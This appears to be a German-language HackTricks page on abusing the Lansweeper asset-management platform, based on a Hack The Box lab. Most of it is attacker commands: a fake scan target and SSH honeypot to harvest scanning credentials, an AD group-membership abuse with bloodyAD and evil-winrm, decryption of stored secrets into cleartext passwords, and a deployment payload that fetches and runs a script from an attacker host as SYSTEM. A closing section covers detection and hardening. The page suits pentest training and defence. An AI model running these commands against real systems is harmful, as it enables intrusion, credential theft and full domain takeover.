# Lansweeper-Missbrauch: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ist eine Plattform zur IT‑Asset-Erkennung und Inventarisierung, die häufig auf Windows betrieben und in Active Directory integriert wird. In Lansweeper konfigurierte Anmeldedaten werden von seinen Scanning-Engines verwendet, um sich gegenüber Assets über Protokolle wie SSH, SMB/WMI und WinRM zu authentifizieren. Fehlkonfigurationen erlauben häufig:

- Abfangen von Anmeldedaten durch Umleitung eines Scanning Targets zu einem vom Angreifer kontrollierten Host (honeypot)
- Missbrauch von AD ACLs, die durch Lansweeper-bezogene Gruppen offengelegt werden, um Remotezugriff zu erlangen
- On‑Host‑Entschlüsselung der in Lansweeper konfigurierten Secrets (Connection Strings und gespeicherte Scanning-Credentials)
- Codeausführung auf verwalteten Endpunkten über die Deployment-Funktion (läuft oft als SYSTEM)

Diese Seite fasst praktische Angreifer‑Workflows und Befehle zusammen, um dieses Verhalten während Engagements auszunutzen.

## 1) Scanning-Credentials per honeypot abgreifen (SSH-Beispiel)

Idee: Erstelle ein Scanning Target, das auf deinen Host zeigt, und weise vorhandene Scanning-Credentials darauf zu. Wenn der Scan ausgeführt wird, versucht Lansweeper, sich mit diesen Credentials zu authentifizieren, und dein honeypot wird die Versuche erfassen.

Schritte (Web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = deine VPN-IP
- Configure SSH port to something reachable (z. B. 2022, falls 22 geblockt ist)
- Disable schedule und plane, manuell zu triggern
- Scanning → Scanning Credentials → sicherstellen, dass Linux/SSH-Creds existieren; diese dem neuen Target zuordnen (bei Bedarf alle aktivieren)
- Click “Scan now” am Target
- Starte einen SSH-honeypot und extrahiere die versuchten Username/Passwort-Kombinationen

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Erfasste creds gegen DC-Dienste validieren:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Hinweise
- Funktioniert ähnlich für andere Protokolle, wenn man den Scanner zu seinem Listener zwingen kann (SMB/WinRM-Honeypots, etc.). SSH ist oft am einfachsten.
- Viele Scanner identifizieren sich durch eindeutige Client-Banner (z. B. RebexSSH) und versuchen harmlose Befehle (uname, whoami, etc.).

## 2) AD ACL abuse: Remote-Zugriff erlangen, indem wir uns selbst zu einer app-admin-Gruppe hinzufügen

Verwende BloodHound, um die effektiven Berechtigungen des kompromittierten Accounts zu ermitteln. Eine häufige Feststellung ist eine scanner- oder app-spezifische Gruppe (z. B. “Lansweeper Discovery”), die GenericAll-Rechte an einer privilegierten Gruppe besitzt (z. B. “Lansweeper Admins”). Wenn die privilegierte Gruppe außerdem Mitglied der “Remote Management Users” ist, wird WinRM verfügbar, sobald wir uns selbst hinzufügen.

Sammelbeispiele:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll an einer Gruppe mit BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dann eine interaktive Shell erhalten:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Tipp: Kerberos-Operationen sind zeitkritisch. Wenn du auf KRB_AP_ERR_SKEW stößt, synchronisiere zuerst die Uhrzeit mit dem DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Entschlüsseln von in Lansweeper konfigurierten Secrets auf dem Host

Auf dem Lansweeper-Server speichert die ASP.NET-Site typischerweise einen verschlüsselten connection string und einen symmetrischen Schlüssel, der von der Anwendung verwendet wird. Mit entsprechendem lokalem Zugriff können Sie den DB-connection string entschlüsseln und anschließend gespeicherte Scan-Credentials extrahieren.

Typische Speicherorte:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Verwenden Sie SharpLansweeperDecrypt, um die Entschlüsselung und das Dumpen der gespeicherten creds zu automatisieren:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Die erwartete Ausgabe enthält DB-Verbindungsdetails und Klartext-Scan-Zugangsdaten wie Windows- und Linux-Konten, die in der gesamten Infrastruktur verwendet werden. Diese haben oft erhöhte lokale Rechte auf Domain-Hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Verwende wiedererlangte Windows scanning creds für privilegierten Zugriff:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Als Mitglied der “Lansweeper Admins” zeigt die Web-UI die Bereiche Deployment und Configuration. Unter Deployment → Deployment packages kannst du Packages erstellen, die beliebige Befehle auf ausgewählten Assets ausführen. Die Ausführung erfolgt durch den Lansweeper service mit hohen Rechten, was Codeausführung als NT AUTHORITY\SYSTEM auf dem ausgewählten Host ermöglicht.

Wesentliche Schritte:
- Erstelle ein neues Deployment package, das einen PowerShell- oder cmd-One-Liner ausführt (reverse shell, add-user, usw.).
- Wähle das gewünschte Asset aus (z. B. den DC/Host, auf dem Lansweeper läuft) und klicke auf Deploy/Run now.
- Fange deine Shell als SYSTEM.

Beispiel-Payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment-Aktionen sind laut und hinterlassen Logs in Lansweeper- und Windows-Ereignisprotokollen. Mit Bedacht einsetzen.

## Erkennung und Härtung

- Anonyme SMB-Aufzählungen einschränken oder entfernen. Auf RID-Cycling und anomalen Zugriff auf Lansweeper-Shares überwachen.
- Egress-Kontrollen: Ausgangs-SSH/SMB/WinRM von Scanner-Hosts blockieren oder stark einschränken. Auf nicht-standardmäßige Ports (z. B. 2022) und ungewöhnliche Client-Banner wie Rebex alarmieren.
- Schützen Sie `Website\\web.config` und `Key\\Encryption.txt`. Geheimnisse extern in einen Vault auslagern und bei Offenlegung rotieren. Service-Accounts mit minimalen Rechten und gMSA dort in Betracht ziehen, wo möglich.
- AD-Überwachung: Alarm bei Änderungen an Lansweeper-bezogenen Gruppen (z. B. „Lansweeper Admins“, „Remote Management Users“) und bei ACL-Änderungen, die GenericAll/Write-Mitgliedschaft für privilegierte Gruppen gewähren.
- Deployment-Paket-Erstellungen/-Änderungen/-Ausführungen prüfen; Alarm bei Paketen, die cmd.exe/powershell.exe starten oder unerwartete ausgehende Verbindungen herstellen.

## Verwandte Themen
- SMB/LSA/SAMR-Aufzählung und RID-Cycling
- Kerberos password spraying und Überlegungen zu clock skew
- BloodHound-Pfadanalyse von application-admin-Gruppen
- WinRM-Nutzung und lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
